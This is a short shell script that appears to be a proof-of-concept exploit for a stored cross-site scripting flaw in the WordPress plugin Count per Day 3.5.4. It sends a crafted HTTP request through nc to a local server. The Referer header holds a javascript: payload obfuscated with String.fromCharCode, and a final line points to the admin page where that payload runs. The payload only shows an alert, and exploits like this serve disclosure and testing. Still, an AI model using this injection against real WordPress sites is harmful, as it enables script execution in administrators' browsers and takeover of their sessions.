# https://wpvulndb.com/vulnerabilities/8587
# works for count per day 3.5.4

echo "GET / HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8,nl;q=0.6
x-forwarded-for: 1.1.1.5
Referer: javascript:c=String.fromCharCode;alert(c(83)+c(117)+c(109)+c(79)+c(102)+c(80)+c(119)+c(110)+c(46)+c(110)+c(108))
Connection: close
" | nc localhost 8080

echo "visit http://localhost:8080/wp-admin/index.php?page=cpd_metaboxes and check Referer"
